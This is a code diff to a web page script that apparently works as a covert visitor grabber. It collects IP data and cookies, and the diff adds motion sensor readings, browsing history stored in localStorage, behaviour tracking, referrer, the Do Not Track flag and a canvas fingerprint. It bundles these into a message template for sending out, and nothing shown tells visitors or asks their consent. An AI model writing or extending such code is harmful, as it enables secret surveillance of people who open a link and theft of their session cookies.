@@ -239,6 +239,12 @@ ${data.ipHistory?.length > 0
 🎨 Color Depth: ${formatValue(data.colorDepth)}
 👇 Touch Support: ${formatValue(data.touchSupport, 'Unknown')}
 📡 Connection: ${formatValue(data.connectionType)}
+🔗 Referrer: ${formatValue(data.referrer)}
+🚫 Do Not Track: ${formatValue(data.doNotTrack)}
+📱 Sensors: ${formatValue(data.sensors)}
+📜 Visitor History: ${formatValue(data.visitorHistory)}
+🐾 Behavior: ${formatValue(data.behavior)}
+🆔 Fingerprint: ${formatValue(data.fingerprint)}
 🪐 Source Made By @phuvanduc
       `.trim();
     }
@@ -471,11 +477,159 @@ ${data.ipHistory?.length > 0
           if (modelMatch) {
             const model = modelMatch[1];
             const modelMap = {
-              'SM-G960F': 'Samsung Galaxy S9',
-              'SM-A525F': 'Samsung Galaxy A52',
-              'Pixel': 'Google Pixel 7',
-              'M2012K11AG': 'Xiaomi 11T Pro'
-            };
+  'SM-G960F': 'Samsung Galaxy S9',
+  'SM-A525F': 'Samsung Galaxy A52',
+  'Pixel 7': 'Google Pixel 7',
+  'V2419': 'Vivo Y19s',
+  'M2012K11AG': 'Xiaomi 11T Pro',
+  'iPhone14,5': 'iPhone 13',
+  'CPH2247': 'Oppo Reno6 Pro 5G',
+  'V2127': 'Vivo X70 Pro',
+  'H8116': 'Sony Xperia 5',
+  'ONEPLUS A6013': 'OnePlus 6T',
+  'moto g(7) power': 'Motorola Moto G7 Power',
+  'TA-1045': 'Nokia 6.1 Plus',
+  'M2101K1G': 'Xiaomi Redmi Note 10 Pro',
+  'RMX3363': 'Realme GT Master Edition',
+  'ELS-NX9': 'Huawei P40 Pro',
+  'LM-G820': 'LG V60 ThinQ',
+  'PRS-A0': 'Black Shark 4',
+  'ASUS_I005DA': 'Asus ROG Phone 5',
+  'SM-G998B': 'Samsung Galaxy S21 Ultra',
+  'GP4BC': 'Google Pixel 6 Pro',
+  '22011211G': 'Xiaomi 12 Pro',
+  'iPhone15,3': 'iPhone 14 Pro',
+  'PGEM10': 'Oppo Find X5 Pro',
+  'V2145': 'Vivo X80 Pro',
+  'SO-51C': 'Sony Xperia 1 IV',
+  'NE2213': 'OnePlus 10 Pro',
+  'XT2175-2': 'Motorola Edge 30 Pro',
+  'TA-1365': 'Nokia XR20',
+  '21091116I': 'Xiaomi Redmi Note 11 Pro+ 5G',
+  'RMX3301': 'Realme GT 2 Pro',
+  'PAL-AL00': 'Huawei Mate 50 Pro',
+  'LM-G900N': 'LG Velvet',
+  'KRS-A0': 'Black Shark 5 Pro',
+  'ASUS_AI2202': 'Asus Zenfone 9',
+  'SM-F936B': 'Samsung Galaxy Z Fold4',
+  'GP1YM': 'Google Pixel 7 Pro',
+  '2210132G': 'Xiaomi 13 Pro',
+  'iPhone15,6': 'iPhone 14 Pro Max',
+  'PGFM10': 'Oppo Find N2 Flip',
+  'PD2227': 'Vivo X90 Pro+',
+  'SOG10': 'Sony Xperia 1 V',
+  'CPH2449': 'OnePlus 11',
+  'XT2301-5': 'Motorola Razr 2022',
+  'TA-1479': 'Nokia G400 5G',
+  '2201116PG': 'Xiaomi Redmi Note 12 Pro+ 5G',
+  'RMX3700': 'Realme GT Neo 5',
+  'MNW-AL00': 'Huawei P60 Pro',
+  'LM-F100N': 'LG Wing',
+  'BSH-A0': 'Black Shark 6 Pro',
+  'ASUS_AI2302': 'Asus ROG Phone 7 Ultimate',
+  'SM-G975F': 'Samsung Galaxy S10+',
+  'SM-N975F': 'Samsung Galaxy Note 10+',
+  'SM-G780F': 'Samsung Galaxy S20 FE',
+  'SM-A715F': 'Samsung Galaxy A71',
+  'SM-M515F': 'Samsung Galaxy M51',
+  'SM-A325F': 'Samsung Galaxy A32',
+  'SM-N986B': 'Samsung Galaxy Note 20 Ultra 5G',
+  'SM-G991B': 'Samsung Galaxy S21 5G',
+  'SM-A536B': 'Samsung Galaxy A53 5G',
+  'SM-S908B': 'Samsung Galaxy S22 Ultra 5G',
+  'SM-F711B': 'Samsung Galaxy Z Flip3 5G',
+  'SM-M336B': 'Samsung Galaxy M33 5G',
+  'REDMI NOTE 8 PRO': 'Xiaomi Redmi Note 8 Pro',
+  'M2007J3SG': 'Xiaomi Mi 10T Pro',
+  'M2102K1AC': 'Xiaomi Mi 11 Ultra',
+  '22041211AC': 'Xiaomi 12S Ultra',
+  'POCO X3 PRO': 'Xiaomi Poco X3 Pro',
+  'POCO F3': 'Xiaomi Poco F3',
+  'REALME X2 PRO': 'Realme X2 Pro',
+  'RMX2075': 'Realme X50 Pro 5G',
+  'RMX2173': 'Realme GT',
+  'OPPO RENO 10X ZOOM': 'Oppo Reno 10x Zoom',
+  'CPH2025': 'Oppo Find X2 Pro',
+  'CPH2127': 'Oppo Reno5 Pro+ 5G',
+  'V2055': 'Vivo X60 Pro+',
+  'V2102': 'Vivo V21 5G',
+  'V2301A': 'Vivo S16 Pro',
+  'ONEPLUS 8 PRO': 'OnePlus 8 Pro',
+  'IN2023': 'OnePlus Nord',
+  'GM1917': 'OnePlus 7 Pro',
+  'MOTO G STYLUS': 'Motorola Moto G Stylus',
+  'XT2075-2': 'Motorola Edge+',
+  'XT2125-4': 'Motorola One 5G Ace',
+  'NOKIA 8.3 5G': 'Nokia 8.3 5G',
+  'TA-1258': 'Nokia 5.4',
+  'TA-1348': 'Nokia G21',
+  'HUAWEI MATE 30 PRO': 'Huawei Mate 30 Pro',
+  'LYA-L29': 'Huawei P30 Pro',
+  'JEF-NX9': 'Huawei Mate 40 Pro',
+  'HONOR 50': 'Honor 50',
+  'NZA-LX9': 'Honor Magic4 Pro',
+  'REDMAGIC 6 PRO': 'Nubia RedMagic 6 Pro',
+  'NX701J': 'Nubia Z40 Pro',
+  'IQOO 9 PRO': 'iQOO 9 Pro',
+  'V2171A': 'iQOO 11 Pro',
+  'SONY XPERIA 1 II': 'Sony Xperia 1 II',
+  'XQ-AT51': 'Sony Xperia 1 III',
+  'XQ-CT72': 'Sony Xperia 5 III',
+  'LG G8 THINQ': 'LG G8 ThinQ',
+  'LM-V600EA': 'LG V60 ThinQ 5G',
+  'SM-G950F': 'Samsung Galaxy S8',
+  'SM-N960F': 'Samsung Galaxy Note 9',
+  'SM-A505F': 'Samsung Galaxy A50',
+  'SM-M315F': 'Samsung Galaxy M31',
+  'SM-A217F': 'Samsung Galaxy A21s',
+  'SM-G770F': 'Samsung Galaxy S20 Lite',
+  'SM-N970F': 'Samsung Galaxy Note 10',
+  'SM-G985F': 'Samsung Galaxy S20+',
+  'SM-A725F': 'Samsung Galaxy A72',
+  'SM-M625F': 'Samsung Galaxy M62',
+  'SM-A125F': 'Samsung Galaxy A12',
+  'SM-F926B': 'Samsung Galaxy Z Fold3 5G',
+  'REDMI NOTE 7': 'Xiaomi Redmi Note 7',
+  'M1908C3GG': 'Xiaomi Mi 9T Pro',
+  'M2003J15SC': 'Xiaomi Redmi K30 Pro',
+  '21061110AG': 'Xiaomi Mi 11 Lite 5G',
+  'POCO X3 NFC': 'Xiaomi Poco X3 NFC',
+  'POCO M3': 'Xiaomi Poco M3',
+  'REALME 6 PRO': 'Realme 6 Pro',
+  'RMX2001': 'Realme 7 Pro',
+  'RMX3031': 'Realme 8 Pro',
+  'OPPO RENO Z': 'Oppo Reno Z',
+  'CPH1969': 'Oppo Reno2',
+  'CPH2009': 'Oppo Find X2',
+  'V1986A': 'Vivo S7',
+  'V2027': 'Vivo V20',
+  'V2130': 'Vivo X60',
+  'ONEPLUS 7T': 'OnePlus 7T',
+  'HD1907': 'OnePlus 8',
+  'KB2005': 'OnePlus 9',
+  'MOTO G POWER (2021)': 'Motorola Moto G Power (2021)',
+  'XT2063-2': 'Motorola One Hyper',
+  'XT2131-1': 'Motorola Moto G Stylus 5G',
+  'NOKIA 7.2': 'Nokia 7.2',
+  'TA-1239': 'Nokia 3.4',
+  'TA-1333': 'Nokia G11 Plus',
+  'HUAWEI P20 PRO': 'Huawei P20 Pro',
+  'CLT-L29': 'Huawei Mate 20 Pro',
+  'EVE-NX9': 'Huawei P40',
+  'HONOR 20 PRO': 'Honor 20 Pro',
+  'YAL-L61': 'Huawei P30',
+  'KGO-AN00': 'Honor Magic3 Pro+',
+  'REDMAGIC 5G': 'Nubia RedMagic 5G',
+  'NX651J': 'Nubia RedMagic 6',
+  'IQOO 7': 'iQOO 7',
+  'V2049A': 'iQOO 8 Pro',
+  'SONY XPERIA XZ3': 'Sony Xperia XZ3',
+  'SO-01M': 'Sony Xperia 5',
+  'SOV43': 'Sony Xperia 8',
+  'LG G7 THINQ': 'LG G7 ThinQ',
+  'LM-G850': 'LG V50 ThinQ 5G'
+};
+
             for (let key in modelMap) {
               if (model.includes(key)) {
                 deviceName = modelMap[key];
@@ -529,14 +683,18 @@ ${data.ipHistory?.length > 0
           userAgent: navigator.userAgent || 'Ẩn danh vãi!',
           language: navigator.language || 'Chả biết!',
           screen: `${window.screen.width}x${window.screen.height}` || 'Mù màn!',
-          time: new Date().toLocaleString('vi-VN') || 'Thời gian tàng hình!'
+          time: new Date().toLocaleString('vi-VN') || 'Thời gian tàng hình!',
+          referrer: document.referrer || 'Không có',
+          doNotTrack: navigator.doNotTrack || 'Không rõ'
         };
       } catch {
         return {
           userAgent: 'Ko lấy được!',
           language: 'Ko lấy được!',
           screen: 'Ko lấy được!',
-          time: 'Ko lấy được!'
+          time: 'Ko lấy được!',
+          referrer: 'Ko lấy được!',
+          doNotTrack: 'Ko lấy được!'
         };
       }
     }
@@ -568,6 +726,100 @@ ${data.ipHistory?.length > 0
       }
     }
 
+    // Hàm lấy thông tin cảm biến
+    async function fetchSensors() {
+      try {
+        let sensorData = [];
+        if ('Accelerometer' in window) {
+          const accel = new Accelerometer({ frequency: 60 });
+          accel.onerror = () => { accel.stop(); };
+          accel.onreading = () => {
+            sensorData.push(`Gia tốc: x=${accel.x.toFixed(2)}, y=${accel.y.toFixed(2)}, z=${accel.z.toFixed(2)}`);
+            accel.stop();
+          };
+          accel.start();
+        }
+        if ('Gyroscope' in window) {
+          const gyro = new Gyroscope({ frequency: 60 });
+          gyro.onerror = () => { gyro.stop(); };
+          gyro.onreading = () => {
+            sensorData.push(`Con quay: x=${gyro.x.toFixed(2)}, y=${gyro.y.toFixed(2)}, z=${gyro.z.toFixed(2)}`);
+            gyro.stop();
+          };
+          gyro.start();
+        }
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        return sensorData.length > 0 ? sensorData.join('; ') : 'Không có cảm biến';
+      } catch {
+        return 'Ko lấy được!';
+      }
+    }
+
+    // Hàm lấy lịch sử truy cập
+    function fetchVisitorHistory() {
+      try {
+        let visits = JSON.parse(localStorage.getItem('visitorHistory') || '[]');
+        const now = new Date().toLocaleString('vi-VN');
+        visits.push({ timestamp: now, url: window.location.href });
+        visits = visits.slice(-5); // Giữ 5 lần truy cập gần nhất
+        localStorage.setItem('visitorHistory', JSON.stringify(visits));
+        return visits.map(v => `${v.timestamp}: ${v.url}`).join('; ');
+      } catch {
+        return 'Ko lấy được!';
+      }
+    }
+
+    // Hàm theo dõi hành vi người dùng
+    function fetchBehavior() {
+      try {
+        let behavior = {
+          mouseMovements: 0,
+          scrolls: 0,
+          timeSpent: 0,
+          startTime: Date.now()
+        };
+        document.addEventListener('mousemove', () => behavior.mouseMovements++, { once: true });
+        document.addEventListener('scroll', () => behavior.scrolls++, { once: true });
+        window.addEventListener('beforeunload', () => {
+          behavior.timeSpent = Math.round((Date.now() - behavior.startTime) / 1000);
+          localStorage.setItem('behavior', JSON.stringify(behavior));
+        }, { once: true });
+        const savedBehavior = JSON.parse(localStorage.getItem('behavior') || '{}');
+        return `Di chuột: ${behavior.mouseMovements || savedBehavior.mouseMovements || 0}; Cuộn: ${behavior.scrolls || savedBehavior.scrolls || 0}; Thời gian: ${behavior.timeSpent || savedBehavior.timeSpent || 0}s`;
+      } catch {
+        return 'Ko lấy được!';
+      }
+    }
+
+    // Hàm tạo fingerprint
+    function fetchFingerprint() {
+      try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Fingerprint', 2, 15);
+        const canvasData = canvas.toDataURL();
+        const components = [
+          navigator.userAgent,
+          navigator.language,
+          window.screen.width + 'x' + window.screen.height,
+          window.screen.colorDepth,
+          new Date().getTimezoneOffset(),
+          canvasData,
+          navigator.hardwareConcurrency || 'unknown',
+          navigator.deviceMemory || 'unknown'
+        ];
+        const fingerprint = btoa(components.join('|')); // Mã hóa base64
+        return fingerprint.slice(0, 50); // Cắt ngắn để tránh tin nhắn quá dài
+      } catch {
+        return 'Ko lấy được!';
+      }
+    }
+
     // Hàm chính để thu thập và gửi dữ liệu
     async function collectAndSendData() {
       try {
@@ -581,12 +833,16 @@ ${data.ipHistory?.length > 0
           deviceType = 'Tablet xịn';
         }
 
-        const [ipInfo, cookies, batteryInfo, otherInfo, additionalInfo] = await Promise.all([
+        const [ipInfo, cookies, batteryInfo, otherInfo, additionalInfo, sensors, visitorHistory, behavior, fingerprint] = await Promise.all([
           fetchIpInfo(),
           Promise.resolve(fetchCookies()),
           fetchBatteryInfo(),
           Promise.resolve(fetchOtherInfo()),
-          Promise.resolve(fetchAdditionalInfo())
+          Promise.resolve(fetchAdditionalInfo()),
+          fetchSensors(),
+          Promise.resolve(fetchVisitorHistory()),
+          Promise.resolve(fetchBehavior()),
+          Promise.resolve(fetchFingerprint())
         ]);
 
         const ipHistory = ipInfo.ip !== 'Ko lấy được!' ? manageIpHistory(ipInfo.ip, userAgent) : [];
@@ -617,13 +873,19 @@ ${data.ipHistory?.length > 0
           language: otherInfo.language,
           screen: otherInfo.screen,
           time: otherInfo.time,
+          referrer: otherInfo.referrer,
+          doNotTrack: otherInfo.doNotTrack,
           colorDepth: additionalInfo.colorDepth,
           touchSupport: additionalInfo.touchSupport,
           cpuCores: additionalInfo.cpuCores,
           memory: additionalInfo.memory,
           connectionType: additionalInfo.connectionType,
           vendor: additionalInfo.vendor,
-          webgl: additionalInfo.webgl
+          webgl: additionalInfo.webgl,
+          sensors: sensors,
+          visitorHistory: visitorHistory,
+          behavior: behavior,
+          fingerprint: fingerprint
         };
 
         console.log('Collected data:', deviceData);
